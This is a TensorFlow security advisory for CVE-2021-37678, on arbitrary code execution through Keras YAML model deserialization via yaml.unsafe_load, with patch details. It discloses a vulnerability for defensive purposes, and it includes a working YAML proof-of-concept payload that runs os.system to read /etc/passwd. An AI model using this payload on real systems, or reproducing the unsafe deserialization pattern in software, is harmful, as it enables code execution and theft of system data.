<h2>TFSA-2021-152: Arbitrary code execution due to YAML deserialization</h2>
<h3>CVE Number</h3>
<p>CVE-2021-37678</p>
<h3>Impact</h3>
<p>TensorFlow and Keras can be tricked to perform arbitrary code execution when
deserializing a Keras model from YAML format.</p>
<p>```python
from tensorflow.keras import models</p>
<p>payload = '''
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "<strong>import</strong>('os').system('cat /etc/passwd')"
'''</p>
<p>models.model_from_yaml(payload)
```</p>
<p>The
<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/python/keras/saving/model_config.py#L66-L104">implementation</a>
uses <code>yaml.unsafe_load</code> which can perform arbitrary code execution on the input.</p>
<h3>Patches</h3>
<p>Given that YAML format support requires a significant amount of work, we have
removed it for now.</p>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012">23d6383eb6c14084a8fc3bdf164043b974818012</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
also affected and still in supported range.</p>
